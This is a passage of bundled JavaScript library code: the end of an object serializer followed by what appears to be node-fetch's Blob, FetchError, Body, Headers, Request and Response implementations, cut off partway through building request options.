                    break;
                case 'Set':
                    values_1.push("new Set");
                    statements_1.push(name + "." + Array.from(thing).map(function (v) { return "add(" + stringify(v) + ")"; }).join('.'));
                    break;
                case 'Map':
                    values_1.push("new Map");
                    statements_1.push(name + "." + Array.from(thing).map(function (_a) {
                        var k = _a[0], v = _a[1];
                        return "set(" + stringify(k) + ", " + stringify(v) + ")";
                    }).join('.'));
                    break;
                default:
                    values_1.push(Object.getPrototypeOf(thing) === null ? 'Object.create(null)' : '{}');
                    Object.keys(thing).forEach(function (key) {
                        statements_1.push("" + name + safeProp(key) + "=" + stringify(thing[key]));
                    });
            }
        });
        statements_1.push("return " + str);
        return "(function(" + params_1.join(',') + "){" + statements_1.join(';') + "}(" + values_1.join(',') + "))";
    }
    else {
        return str;
    }
}
function getName(num) {
    var name = '';
    do {
        name = chars[num % chars.length] + name;
        num = ~~(num / chars.length) - 1;
    } while (num >= 0);
    return reserved.test(name) ? name + "_" : name;
}
function isPrimitive(thing) {
    return Object(thing) !== thing;
}
function stringifyPrimitive(thing) {
    if (typeof thing === 'string')
        return stringifyString(thing);
    if (thing === void 0)
        return 'void 0';
    if (thing === 0 && 1 / thing < 0)
        return '-0';
    var str = String(thing);
    if (typeof thing === 'number')
        return str.replace(/^(-)?0\./, '$1.');
    return str;
}
function getType(thing) {
    return Object.prototype.toString.call(thing).slice(8, -1);
}
function escapeUnsafeChar(c) {
    return escaped$1[c] || c;
}
function escapeUnsafeChars(str) {
    return str.replace(unsafeChars, escapeUnsafeChar);
}
function safeKey(key) {
    return /^[_$a-zA-Z][_$a-zA-Z0-9]*$/.test(key) ? key : escapeUnsafeChars(JSON.stringify(key));
}
function safeProp(key) {
    return /^[_$a-zA-Z][_$a-zA-Z0-9]*$/.test(key) ? "." + key : "[" + escapeUnsafeChars(JSON.stringify(key)) + "]";
}
function stringifyString(str) {
    var result = '"';
    for (var i = 0; i < str.length; i += 1) {
        var char = str.charAt(i);
        var code = char.charCodeAt(0);
        if (char === '"') {
            result += '\\"';
        }
        else if (char in escaped$1) {
            result += escaped$1[char];
        }
        else if (code >= 0xd800 && code <= 0xdfff) {
            var next = str.charCodeAt(i + 1);
            // If this is the beginning of a [high, low] surrogate pair,
            // add the next two characters, otherwise escape
            if (code <= 0xdbff && (next >= 0xdc00 && next <= 0xdfff)) {
                result += char + str[++i];
            }
            else {
                result += "\\u" + code.toString(16).toUpperCase();
            }
        }
        else {
            result += char;
        }
    }
    result += '"';
    return result;
}

// Based on https://github.com/tmpvar/jsdom/blob/aa85b2abf07766ff7bf5c1f6daafb3726f2f2db5/lib/jsdom/living/blob.js

// fix for "Readable" isn't a named export issue
const Readable = Stream.Readable;

const BUFFER = Symbol('buffer');
const TYPE = Symbol('type');

class Blob {
	constructor() {
		this[TYPE] = '';

		const blobParts = arguments[0];
		const options = arguments[1];

		const buffers = [];
		let size = 0;

		if (blobParts) {
			const a = blobParts;
			const length = Number(a.length);
			for (let i = 0; i < length; i++) {
				const element = a[i];
				let buffer;
				if (element instanceof Buffer) {
					buffer = element;
				} else if (ArrayBuffer.isView(element)) {
					buffer = Buffer.from(element.buffer, element.byteOffset, element.byteLength);
				} else if (element instanceof ArrayBuffer) {
					buffer = Buffer.from(element);
				} else if (element instanceof Blob) {
					buffer = element[BUFFER];
				} else {
					buffer = Buffer.from(typeof element === 'string' ? element : String(element));
				}
				size += buffer.length;
				buffers.push(buffer);
			}
		}

		this[BUFFER] = Buffer.concat(buffers);

		let type = options && options.type !== undefined && String(options.type).toLowerCase();
		if (type && !/[^\u0020-\u007E]/.test(type)) {
			this[TYPE] = type;
		}
	}
	get size() {
		return this[BUFFER].length;
	}
	get type() {
		return this[TYPE];
	}
	text() {
		return Promise.resolve(this[BUFFER].toString());
	}
	arrayBuffer() {
		const buf = this[BUFFER];
		const ab = buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
		return Promise.resolve(ab);
	}
	stream() {
		const readable = new Readable();
		readable._read = function () {};
		readable.push(this[BUFFER]);
		readable.push(null);
		return readable;
	}
	toString() {
		return '[object Blob]';
	}
	slice() {
		const size = this.size;

		const start = arguments[0];
		const end = arguments[1];
		let relativeStart, relativeEnd;
		if (start === undefined) {
			relativeStart = 0;
		} else if (start < 0) {
			relativeStart = Math.max(size + start, 0);
		} else {
			relativeStart = Math.min(start, size);
		}
		if (end === undefined) {
			relativeEnd = size;
		} else if (end < 0) {
			relativeEnd = Math.max(size + end, 0);
		} else {
			relativeEnd = Math.min(end, size);
		}
		const span = Math.max(relativeEnd - relativeStart, 0);

		const buffer = this[BUFFER];
		const slicedBuffer = buffer.slice(relativeStart, relativeStart + span);
		const blob = new Blob([], { type: arguments[2] });
		blob[BUFFER] = slicedBuffer;
		return blob;
	}
}

Object.defineProperties(Blob.prototype, {
	size: { enumerable: true },
	type: { enumerable: true },
	slice: { enumerable: true }
});

Object.defineProperty(Blob.prototype, Symbol.toStringTag, {
	value: 'Blob',
	writable: false,
	enumerable: false,
	configurable: true
});

/**
 * fetch-error.js
 *
 * FetchError interface for operational errors
 */

/**
 * Create FetchError instance
 *
 * @param   String      message      Error message for human
 * @param   String      type         Error type for machine
 * @param   String      systemError  For Node.js system error
 * @return  FetchError
 */
function FetchError(message, type, systemError) {
  Error.call(this, message);

  this.message = message;
  this.type = type;

  // when err.type is `system`, err.code contains system error code
  if (systemError) {
    this.code = this.errno = systemError.code;
  }

  // hide custom error implementation details from end-users
  Error.captureStackTrace(this, this.constructor);
}

FetchError.prototype = Object.create(Error.prototype);
FetchError.prototype.constructor = FetchError;
FetchError.prototype.name = 'FetchError';

let convert;
try {
	convert = require('encoding').convert;
} catch (e) {}

const INTERNALS = Symbol('Body internals');

// fix an issue where "PassThrough" isn't a named export for node <10
const PassThrough = Stream.PassThrough;

/**
 * Body mixin
 *
 * Ref: https://fetch.spec.whatwg.org/#body
 *
 * @param   Stream  body  Readable stream
 * @param   Object  opts  Response options
 * @return  Void
 */
function Body(body) {
	var _this = this;

	var _ref = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {},
	    _ref$size = _ref.size;

	let size = _ref$size === undefined ? 0 : _ref$size;
	var _ref$timeout = _ref.timeout;
	let timeout = _ref$timeout === undefined ? 0 : _ref$timeout;

	if (body == null) {
		// body is undefined or null
		body = null;
	} else if (isURLSearchParams(body)) {
		// body is a URLSearchParams
		body = Buffer.from(body.toString());
	} else if (isBlob(body)) ; else if (Buffer.isBuffer(body)) ; else if (Object.prototype.toString.call(body) === '[object ArrayBuffer]') {
		// body is ArrayBuffer
		body = Buffer.from(body);
	} else if (ArrayBuffer.isView(body)) {
		// body is ArrayBufferView
		body = Buffer.from(body.buffer, body.byteOffset, body.byteLength);
	} else if (body instanceof Stream) ; else {
		// none of the above
		// coerce to string then buffer
		body = Buffer.from(String(body));
	}
	this[INTERNALS] = {
		body,
		disturbed: false,
		error: null
	};
	this.size = size;
	this.timeout = timeout;

	if (body instanceof Stream) {
		body.on('error', function (err) {
			const error = err.name === 'AbortError' ? err : new FetchError(`Invalid response body while trying to fetch ${_this.url}: ${err.message}`, 'system', err);
			_this[INTERNALS].error = error;
		});
	}
}

Body.prototype = {
	get body() {
		return this[INTERNALS].body;
	},

	get bodyUsed() {
		return this[INTERNALS].disturbed;
	},

	/**
  * Decode response as ArrayBuffer
  *
  * @return  Promise
  */
	arrayBuffer() {
		return consumeBody.call(this).then(function (buf) {
			return buf.buffer.slice(buf.byteOffset, buf.byteOffset + buf.byteLength);
		});
	},

	/**
  * Return raw response as Blob
  *
  * @return Promise
  */
	blob() {
		let ct = this.headers && this.headers.get('content-type') || '';
		return consumeBody.call(this).then(function (buf) {
			return Object.assign(
			// Prevent copying
			new Blob([], {
				type: ct.toLowerCase()
			}), {
				[BUFFER]: buf
			});
		});
	},

	/**
  * Decode response as json
  *
  * @return  Promise
  */
	json() {
		var _this2 = this;

		return consumeBody.call(this).then(function (buffer) {
			try {
				return JSON.parse(buffer.toString());
			} catch (err) {
				return Body.Promise.reject(new FetchError(`invalid json response body at ${_this2.url} reason: ${err.message}`, 'invalid-json'));
			}
		});
	},

	/**
  * Decode response as text
  *
  * @return  Promise
  */
	text() {
		return consumeBody.call(this).then(function (buffer) {
			return buffer.toString();
		});
	},

	/**
  * Decode response as buffer (non-spec api)
  *
  * @return  Promise
  */
	buffer() {
		return consumeBody.call(this);
	},

	/**
  * Decode response as text, while automatically detecting the encoding and
  * trying to decode to UTF-8 (non-spec api)
  *
  * @return  Promise
  */
	textConverted() {
		var _this3 = this;

		return consumeBody.call(this).then(function (buffer) {
			return convertBody(buffer, _this3.headers);
		});
	}
};

// In browsers, all properties are enumerable.
Object.defineProperties(Body.prototype, {
	body: { enumerable: true },
	bodyUsed: { enumerable: true },
	arrayBuffer: { enumerable: true },
	blob: { enumerable: true },
	json: { enumerable: true },
	text: { enumerable: true }
});

Body.mixIn = function (proto) {
	for (const name of Object.getOwnPropertyNames(Body.prototype)) {
		// istanbul ignore else: future proof
		if (!(name in proto)) {
			const desc = Object.getOwnPropertyDescriptor(Body.prototype, name);
			Object.defineProperty(proto, name, desc);
		}
	}
};

/**
 * Consume and convert an entire Body to a Buffer.
 *
 * Ref: https://fetch.spec.whatwg.org/#concept-body-consume-body
 *
 * @return  Promise
 */
function consumeBody() {
	var _this4 = this;

	if (this[INTERNALS].disturbed) {
		return Body.Promise.reject(new TypeError(`body used already for: ${this.url}`));
	}

	this[INTERNALS].disturbed = true;

	if (this[INTERNALS].error) {
		return Body.Promise.reject(this[INTERNALS].error);
	}

	let body = this.body;

	// body is null
	if (body === null) {
		return Body.Promise.resolve(Buffer.alloc(0));
	}

	// body is blob
	if (isBlob(body)) {
		body = body.stream();
	}

	// body is buffer
	if (Buffer.isBuffer(body)) {
		return Body.Promise.resolve(body);
	}

	// istanbul ignore if: should never happen
	if (!(body instanceof Stream)) {
		return Body.Promise.resolve(Buffer.alloc(0));
	}

	// body is stream
	// get ready to actually consume the body
	let accum = [];
	let accumBytes = 0;
	let abort = false;

	return new Body.Promise(function (resolve, reject) {
		let resTimeout;

		// allow timeout on slow response body
		if (_this4.timeout) {
			resTimeout = setTimeout(function () {
				abort = true;
				reject(new FetchError(`Response timeout while trying to fetch ${_this4.url} (over ${_this4.timeout}ms)`, 'body-timeout'));
			}, _this4.timeout);
		}

		// handle stream errors
		body.on('error', function (err) {
			if (err.name === 'AbortError') {
				// if the request was aborted, reject with this Error
				abort = true;
				reject(err);
			} else {
				// other errors, such as incorrect content-encoding
				reject(new FetchError(`Invalid response body while trying to fetch ${_this4.url}: ${err.message}`, 'system', err));
			}
		});

		body.on('data', function (chunk) {
			if (abort || chunk === null) {
				return;
			}

			if (_this4.size && accumBytes + chunk.length > _this4.size) {
				abort = true;
				reject(new FetchError(`content size at ${_this4.url} over limit: ${_this4.size}`, 'max-size'));
				return;
			}

			accumBytes += chunk.length;
			accum.push(chunk);
		});

		body.on('end', function () {
			if (abort) {
				return;
			}

			clearTimeout(resTimeout);

			try {
				resolve(Buffer.concat(accum, accumBytes));
			} catch (err) {
				// handle streams that have accumulated too much data (issue #414)
				reject(new FetchError(`Could not create Buffer from response body for ${_this4.url}: ${err.message}`, 'system', err));
			}
		});
	});
}

/**
 * Detect buffer encoding and convert to target encoding
 * ref: http://www.w3.org/TR/2011/WD-html5-20110113/parsing.html#determining-the-character-encoding
 *
 * @param   Buffer  buffer    Incoming buffer
 * @param   String  encoding  Target encoding
 * @return  String
 */
function convertBody(buffer, headers) {
	if (typeof convert !== 'function') {
		throw new Error('The package `encoding` must be installed to use the textConverted() function');
	}

	const ct = headers.get('content-type');
	let charset = 'utf-8';
	let res, str;

	// header
	if (ct) {
		res = /charset=([^;]*)/i.exec(ct);
	}

	// no charset in content type, peek at response body for at most 1024 bytes
	str = buffer.slice(0, 1024).toString();

	// html5
	if (!res && str) {
		res = /<meta.+?charset=(['"])(.+?)\1/i.exec(str);
	}

	// html4
	if (!res && str) {
		res = /<meta[\s]+?http-equiv=(['"])content-type\1[\s]+?content=(['"])(.+?)\2/i.exec(str);

		if (res) {
			res = /charset=(.*)/i.exec(res.pop());
		}
	}

	// xml
	if (!res && str) {
		res = /<\?xml.+?encoding=(['"])(.+?)\1/i.exec(str);
	}

	// found charset
	if (res) {
		charset = res.pop();

		// prevent decode issues when sites use incorrect encoding
		// ref: https://hsivonen.fi/encoding-menu/
		if (charset === 'gb2312' || charset === 'gbk') {
			charset = 'gb18030';
		}
	}

	// turn raw buffers into a single utf-8 buffer
	return convert(buffer, 'UTF-8', charset).toString();
}

/**
 * Detect a URLSearchParams object
 * ref: https://github.com/bitinn/node-fetch/issues/296#issuecomment-307598143
 *
 * @param   Object  obj     Object to detect by type or brand
 * @return  String
 */
function isURLSearchParams(obj) {
	// Duck-typing as a necessary condition.
	if (typeof obj !== 'object' || typeof obj.append !== 'function' || typeof obj.delete !== 'function' || typeof obj.get !== 'function' || typeof obj.getAll !== 'function' || typeof obj.has !== 'function' || typeof obj.set !== 'function') {
		return false;
	}

	// Brand-checking and more duck-typing as optional condition.
	return obj.constructor.name === 'URLSearchParams' || Object.prototype.toString.call(obj) === '[object URLSearchParams]' || typeof obj.sort === 'function';
}

/**
 * Check if `obj` is a W3C `Blob` object (which `File` inherits from)
 * @param  {*} obj
 * @return {boolean}
 */
function isBlob(obj) {
	return typeof obj === 'object' && typeof obj.arrayBuffer === 'function' && typeof obj.type === 'string' && typeof obj.stream === 'function' && typeof obj.constructor === 'function' && typeof obj.constructor.name === 'string' && /^(Blob|File)$/.test(obj.constructor.name) && /^(Blob|File)$/.test(obj[Symbol.toStringTag]);
}

/**
 * Clone body given Res/Req instance
 *
 * @param   Mixed  instance  Response or Request instance
 * @return  Mixed
 */
function clone(instance) {
	let p1, p2;
	let body = instance.body;

	// don't allow cloning a used body
	if (instance.bodyUsed) {
		throw new Error('cannot clone body after it is used');
	}

	// check that body is a stream and not form-data object
	// note: we can't clone the form-data object without having it as a dependency
	if (body instanceof Stream && typeof body.getBoundary !== 'function') {
		// tee instance body
		p1 = new PassThrough();
		p2 = new PassThrough();
		body.pipe(p1);
		body.pipe(p2);
		// set instance body to teed body and return the other teed body
		instance[INTERNALS].body = p1;
		body = p2;
	}

	return body;
}

/**
 * Performs the operation "extract a `Content-Type` value from |object|" as
 * specified in the specification:
 * https://fetch.spec.whatwg.org/#concept-bodyinit-extract
 *
 * This function assumes that instance.body is present.
 *
 * @param   Mixed  instance  Any options.body input
 */
function extractContentType(body) {
	if (body === null) {
		// body is null
		return null;
	} else if (typeof body === 'string') {
		// body is string
		return 'text/plain;charset=UTF-8';
	} else if (isURLSearchParams(body)) {
		// body is a URLSearchParams
		return 'application/x-www-form-urlencoded;charset=UTF-8';
	} else if (isBlob(body)) {
		// body is blob
		return body.type || null;
	} else if (Buffer.isBuffer(body)) {
		// body is buffer
		return null;
	} else if (Object.prototype.toString.call(body) === '[object ArrayBuffer]') {
		// body is ArrayBuffer
		return null;
	} else if (ArrayBuffer.isView(body)) {
		// body is ArrayBufferView
		return null;
	} else if (typeof body.getBoundary === 'function') {
		// detect form data input from form-data module
		return `multipart/form-data;boundary=${body.getBoundary()}`;
	} else if (body instanceof Stream) {
		// body is stream
		// can't really do much about this
		return null;
	} else {
		// Body constructor defaults other things to string
		return 'text/plain;charset=UTF-8';
	}
}

/**
 * The Fetch Standard treats this as if "total bytes" is a property on the body.
 * For us, we have to explicitly get it with a function.
 *
 * ref: https://fetch.spec.whatwg.org/#concept-body-total-bytes
 *
 * @param   Body    instance   Instance of Body
 * @return  Number?            Number of bytes, or null if not possible
 */
function getTotalBytes(instance) {
	const body = instance.body;


	if (body === null) {
		// body is null
		return 0;
	} else if (isBlob(body)) {
		return body.size;
	} else if (Buffer.isBuffer(body)) {
		// body is buffer
		return body.length;
	} else if (body && typeof body.getLengthSync === 'function') {
		// detect form data input from form-data module
		if (body._lengthRetrievers && body._lengthRetrievers.length == 0 || // 1.x
		body.hasKnownLength && body.hasKnownLength()) {
			// 2.x
			return body.getLengthSync();
		}
		return null;
	} else {
		// body is stream
		return null;
	}
}

/**
 * Write a Body to a Node.js WritableStream (e.g. http.Request) object.
 *
 * @param   Body    instance   Instance of Body
 * @return  Void
 */
function writeToStream(dest, instance) {
	const body = instance.body;


	if (body === null) {
		// body is null
		dest.end();
	} else if (isBlob(body)) {
		body.stream().pipe(dest);
	} else if (Buffer.isBuffer(body)) {
		// body is buffer
		dest.write(body);
		dest.end();
	} else {
		// body is stream
		body.pipe(dest);
	}
}

// expose Promise
Body.Promise = global.Promise;

/**
 * headers.js
 *
 * Headers class offers convenient helpers
 */

const invalidTokenRegex = /[^\^_`a-zA-Z\-0-9!#$%&'*+.|~]/;
const invalidHeaderCharRegex = /[^\t\x20-\x7e\x80-\xff]/;

function validateName(name) {
	name = `${name}`;
	if (invalidTokenRegex.test(name) || name === '') {
		throw new TypeError(`${name} is not a legal HTTP header name`);
	}
}

function validateValue(value) {
	value = `${value}`;
	if (invalidHeaderCharRegex.test(value)) {
		throw new TypeError(`${value} is not a legal HTTP header value`);
	}
}

/**
 * Find the key in the map object given a header name.
 *
 * Returns undefined if not found.
 *
 * @param   String  name  Header name
 * @return  String|Undefined
 */
function find(map, name) {
	name = name.toLowerCase();
	for (const key in map) {
		if (key.toLowerCase() === name) {
			return key;
		}
	}
	return undefined;
}

const MAP = Symbol('map');
class Headers {
	/**
  * Headers class
  *
  * @param   Object  headers  Response headers
  * @return  Void
  */
	constructor() {
		let init = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : undefined;

		this[MAP] = Object.create(null);

		if (init instanceof Headers) {
			const rawHeaders = init.raw();
			const headerNames = Object.keys(rawHeaders);

			for (const headerName of headerNames) {
				for (const value of rawHeaders[headerName]) {
					this.append(headerName, value);
				}
			}

			return;
		}

		// We don't worry about converting prop to ByteString here as append()
		// will handle it.
		if (init == null) ; else if (typeof init === 'object') {
			const method = init[Symbol.iterator];
			if (method != null) {
				if (typeof method !== 'function') {
					throw new TypeError('Header pairs must be iterable');
				}

				// sequence<sequence<ByteString>>
				// Note: per spec we have to first exhaust the lists then process them
				const pairs = [];
				for (const pair of init) {
					if (typeof pair !== 'object' || typeof pair[Symbol.iterator] !== 'function') {
						throw new TypeError('Each header pair must be iterable');
					}
					pairs.push(Array.from(pair));
				}

				for (const pair of pairs) {
					if (pair.length !== 2) {
						throw new TypeError('Each header pair must be a name/value tuple');
					}
					this.append(pair[0], pair[1]);
				}
			} else {
				// record<ByteString, ByteString>
				for (const key of Object.keys(init)) {
					const value = init[key];
					this.append(key, value);
				}
			}
		} else {
			throw new TypeError('Provided initializer must be an object');
		}
	}

	/**
  * Return combined header value given name
  *
  * @param   String  name  Header name
  * @return  Mixed
  */
	get(name) {
		name = `${name}`;
		validateName(name);
		const key = find(this[MAP], name);
		if (key === undefined) {
			return null;
		}

		return this[MAP][key].join(', ');
	}

	/**
  * Iterate over all headers
  *
  * @param   Function  callback  Executed for each item with parameters (value, name, thisArg)
  * @param   Boolean   thisArg   `this` context for callback function
  * @return  Void
  */
	forEach(callback) {
		let thisArg = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : undefined;

		let pairs = getHeaders(this);
		let i = 0;
		while (i < pairs.length) {
			var _pairs$i = pairs[i];
			const name = _pairs$i[0],
			      value = _pairs$i[1];

			callback.call(thisArg, value, name, this);
			pairs = getHeaders(this);
			i++;
		}
	}

	/**
  * Overwrite header values given name
  *
  * @param   String  name   Header name
  * @param   String  value  Header value
  * @return  Void
  */
	set(name, value) {
		name = `${name}`;
		value = `${value}`;
		validateName(name);
		validateValue(value);
		const key = find(this[MAP], name);
		this[MAP][key !== undefined ? key : name] = [value];
	}

	/**
  * Append a value onto existing header
  *
  * @param   String  name   Header name
  * @param   String  value  Header value
  * @return  Void
  */
	append(name, value) {
		name = `${name}`;
		value = `${value}`;
		validateName(name);
		validateValue(value);
		const key = find(this[MAP], name);
		if (key !== undefined) {
			this[MAP][key].push(value);
		} else {
			this[MAP][name] = [value];
		}
	}

	/**
  * Check for header name existence
  *
  * @param   String   name  Header name
  * @return  Boolean
  */
	has(name) {
		name = `${name}`;
		validateName(name);
		return find(this[MAP], name) !== undefined;
	}

	/**
  * Delete all header values given name
  *
  * @param   String  name  Header name
  * @return  Void
  */
	delete(name) {
		name = `${name}`;
		validateName(name);
		const key = find(this[MAP], name);
		if (key !== undefined) {
			delete this[MAP][key];
		}
	}

	/**
  * Return raw headers (non-spec api)
  *
  * @return  Object
  */
	raw() {
		return this[MAP];
	}

	/**
  * Get an iterator on keys.
  *
  * @return  Iterator
  */
	keys() {
		return createHeadersIterator(this, 'key');
	}

	/**
  * Get an iterator on values.
  *
  * @return  Iterator
  */
	values() {
		return createHeadersIterator(this, 'value');
	}

	/**
  * Get an iterator on entries.
  *
  * This is the default iterator of the Headers object.
  *
  * @return  Iterator
  */
	[Symbol.iterator]() {
		return createHeadersIterator(this, 'key+value');
	}
}
Headers.prototype.entries = Headers.prototype[Symbol.iterator];

Object.defineProperty(Headers.prototype, Symbol.toStringTag, {
	value: 'Headers',
	writable: false,
	enumerable: false,
	configurable: true
});

Object.defineProperties(Headers.prototype, {
	get: { enumerable: true },
	forEach: { enumerable: true },
	set: { enumerable: true },
	append: { enumerable: true },
	has: { enumerable: true },
	delete: { enumerable: true },
	keys: { enumerable: true },
	values: { enumerable: true },
	entries: { enumerable: true }
});

function getHeaders(headers) {
	let kind = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : 'key+value';

	const keys = Object.keys(headers[MAP]).sort();
	return keys.map(kind === 'key' ? function (k) {
		return k.toLowerCase();
	} : kind === 'value' ? function (k) {
		return headers[MAP][k].join(', ');
	} : function (k) {
		return [k.toLowerCase(), headers[MAP][k].join(', ')];
	});
}

const INTERNAL = Symbol('internal');

function createHeadersIterator(target, kind) {
	const iterator = Object.create(HeadersIteratorPrototype);
	iterator[INTERNAL] = {
		target,
		kind,
		index: 0
	};
	return iterator;
}

const HeadersIteratorPrototype = Object.setPrototypeOf({
	next() {
		// istanbul ignore if
		if (!this || Object.getPrototypeOf(this) !== HeadersIteratorPrototype) {
			throw new TypeError('Value of `this` is not a HeadersIterator');
		}

		var _INTERNAL = this[INTERNAL];
		const target = _INTERNAL.target,
		      kind = _INTERNAL.kind,
		      index = _INTERNAL.index;

		const values = getHeaders(target, kind);
		const len = values.length;
		if (index >= len) {
			return {
				value: undefined,
				done: true
			};
		}

		this[INTERNAL].index = index + 1;

		return {
			value: values[index],
			done: false
		};
	}
}, Object.getPrototypeOf(Object.getPrototypeOf([][Symbol.iterator]())));

Object.defineProperty(HeadersIteratorPrototype, Symbol.toStringTag, {
	value: 'HeadersIterator',
	writable: false,
	enumerable: false,
	configurable: true
});

/**
 * Export the Headers object in a form that Node.js can consume.
 *
 * @param   Headers  headers
 * @return  Object
 */
function exportNodeCompatibleHeaders(headers) {
	const obj = Object.assign({ __proto__: null }, headers[MAP]);

	// http.request() only supports string as Host header. This hack makes
	// specifying custom Host header possible.
	const hostHeaderKey = find(headers[MAP], 'Host');
	if (hostHeaderKey !== undefined) {
		obj[hostHeaderKey] = obj[hostHeaderKey][0];
	}

	return obj;
}

/**
 * Create a Headers object from an object of headers, ignoring those that do
 * not conform to HTTP grammar productions.
 *
 * @param   Object  obj  Object of headers
 * @return  Headers
 */
function createHeadersLenient(obj) {
	const headers = new Headers();
	for (const name of Object.keys(obj)) {
		if (invalidTokenRegex.test(name)) {
			continue;
		}
		if (Array.isArray(obj[name])) {
			for (const val of obj[name]) {
				if (invalidHeaderCharRegex.test(val)) {
					continue;
				}
				if (headers[MAP][name] === undefined) {
					headers[MAP][name] = [val];
				} else {
					headers[MAP][name].push(val);
				}
			}
		} else if (!invalidHeaderCharRegex.test(obj[name])) {
			headers[MAP][name] = [obj[name]];
		}
	}
	return headers;
}

const INTERNALS$1 = Symbol('Response internals');

// fix an issue where "STATUS_CODES" aren't a named export for node <10
const STATUS_CODES = http.STATUS_CODES;

/**
 * Response class
 *
 * @param   Stream  body  Readable stream
 * @param   Object  opts  Response options
 * @return  Void
 */
class Response {
	constructor() {
		let body = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : null;
		let opts = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

		Body.call(this, body, opts);

		const status = opts.status || 200;
		const headers = new Headers(opts.headers);

		if (body != null && !headers.has('Content-Type')) {
			const contentType = extractContentType(body);
			if (contentType) {
				headers.append('Content-Type', contentType);
			}
		}

		this[INTERNALS$1] = {
			url: opts.url,
			status,
			statusText: opts.statusText || STATUS_CODES[status],
			headers,
			counter: opts.counter
		};
	}

	get url() {
		return this[INTERNALS$1].url || '';
	}

	get status() {
		return this[INTERNALS$1].status;
	}

	/**
  * Convenience property representing if the request ended normally
  */
	get ok() {
		return this[INTERNALS$1].status >= 200 && this[INTERNALS$1].status < 300;
	}

	get redirected() {
		return this[INTERNALS$1].counter > 0;
	}

	get statusText() {
		return this[INTERNALS$1].statusText;
	}

	get headers() {
		return this[INTERNALS$1].headers;
	}

	/**
  * Clone this response
  *
  * @return  Response
  */
	clone() {
		return new Response(clone(this), {
			url: this.url,
			status: this.status,
			statusText: this.statusText,
			headers: this.headers,
			ok: this.ok,
			redirected: this.redirected
		});
	}
}

Body.mixIn(Response.prototype);

Object.defineProperties(Response.prototype, {
	url: { enumerable: true },
	status: { enumerable: true },
	ok: { enumerable: true },
	redirected: { enumerable: true },
	statusText: { enumerable: true },
	headers: { enumerable: true },
	clone: { enumerable: true }
});

Object.defineProperty(Response.prototype, Symbol.toStringTag, {
	value: 'Response',
	writable: false,
	enumerable: false,
	configurable: true
});

const INTERNALS$2 = Symbol('Request internals');

// fix an issue where "format", "parse" aren't a named export for node <10
const parse_url = Url.parse;
const format_url = Url.format;

const streamDestructionSupported = 'destroy' in Stream.Readable.prototype;

/**
 * Check if a value is an instance of Request.
 *
 * @param   Mixed   input
 * @return  Boolean
 */
function isRequest(input) {
	return typeof input === 'object' && typeof input[INTERNALS$2] === 'object';
}

function isAbortSignal(signal) {
	const proto = signal && typeof signal === 'object' && Object.getPrototypeOf(signal);
	return !!(proto && proto.constructor.name === 'AbortSignal');
}

/**
 * Request class
 *
 * @param   Mixed   input  Url or Request instance
 * @param   Object  init   Custom options
 * @return  Void
 */
class Request {
	constructor(input) {
		let init = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {};

		let parsedURL;

		// normalize input
		if (!isRequest(input)) {
			if (input && input.href) {
				// in order to support Node.js' Url objects; though WHATWG's URL objects
				// will fall into this branch also (since their `toString()` will return
				// `href` property anyway)
				parsedURL = parse_url(input.href);
			} else {
				// coerce input to a string before attempting to parse
				parsedURL = parse_url(`${input}`);
			}
			input = {};
		} else {
			parsedURL = parse_url(input.url);
		}

		let method = init.method || input.method || 'GET';
		method = method.toUpperCase();

		if ((init.body != null || isRequest(input) && input.body !== null) && (method === 'GET' || method === 'HEAD')) {
			throw new TypeError('Request with GET/HEAD method cannot have body');
		}

		let inputBody = init.body != null ? init.body : isRequest(input) && input.body !== null ? clone(input) : null;

		Body.call(this, inputBody, {
			timeout: init.timeout || input.timeout || 0,
			size: init.size || input.size || 0
		});

		const headers = new Headers(init.headers || input.headers || {});

		if (inputBody != null && !headers.has('Content-Type')) {
			const contentType = extractContentType(inputBody);
			if (contentType) {
				headers.append('Content-Type', contentType);
			}
		}

		let signal = isRequest(input) ? input.signal : null;
		if ('signal' in init) signal = init.signal;

		if (signal != null && !isAbortSignal(signal)) {
			throw new TypeError('Expected signal to be an instanceof AbortSignal');
		}

		this[INTERNALS$2] = {
			method,
			redirect: init.redirect || input.redirect || 'follow',
			headers,
			parsedURL,
			signal
		};

		// node-fetch-only options
		this.follow = init.follow !== undefined ? init.follow : input.follow !== undefined ? input.follow : 20;
		this.compress = init.compress !== undefined ? init.compress : input.compress !== undefined ? input.compress : true;
		this.counter = init.counter || input.counter || 0;
		this.agent = init.agent || input.agent;
	}

	get method() {
		return this[INTERNALS$2].method;
	}

	get url() {
		return format_url(this[INTERNALS$2].parsedURL);
	}

	get headers() {
		return this[INTERNALS$2].headers;
	}

	get redirect() {
		return this[INTERNALS$2].redirect;
	}

	get signal() {
		return this[INTERNALS$2].signal;
	}

	/**
  * Clone this request
  *
  * @return  Request
  */
	clone() {
		return new Request(this);
	}
}

Body.mixIn(Request.prototype);

Object.defineProperty(Request.prototype, Symbol.toStringTag, {
	value: 'Request',
	writable: false,
	enumerable: false,
	configurable: true
});

Object.defineProperties(Request.prototype, {
	method: { enumerable: true },
	url: { enumerable: true },
	headers: { enumerable: true },
	redirect: { enumerable: true },
	clone: { enumerable: true },
	signal: { enumerable: true }
});

/**
 * Convert a Request to Node.js http request options.
 *
 * @param   Request  A Request instance
 * @return  Object   The options object to be passed to http.request
 */
function getNodeRequestOptions(request) {
	const parsedURL = request[INTERNALS$2].parsedURL;
	const headers = new Headers(request[INTERNALS$2].headers);

	// fetch step 1.3
	if (!headers.has('Accept')) {
		headers.set('Accept', '*/*');
	}

	// Basic fetch
	if (!parsedURL.protocol || !parsedURL.hostname) {
		throw new TypeError('Only absolute URLs are supported');
	}

	if (!/^https?:$/.test(parsedURL.protocol)) {
		throw new TypeError('Only HTTP(S) protocols are supported');
	}

	if (request.signal && request.body instanceof Stream.Readable && !streamDestructionSupported) {
		throw new Error('Cancellation of streamed requests with AbortSignal is not supported in node < 8');
	}

	// HTTP-network-or-cache fetch steps 2.4-2.7
	let contentLengthValue = null;
	if (request.body == null && /^(POST|PUT)$/i.test(request.method)) {
		contentLengthValue = '0';
	}
	if (request.body != null) {
		const totalBytes = getTotalBytes(request);
		if (typeof totalBytes === 'number') {
			contentLengthValue = String(totalBytes);
		}
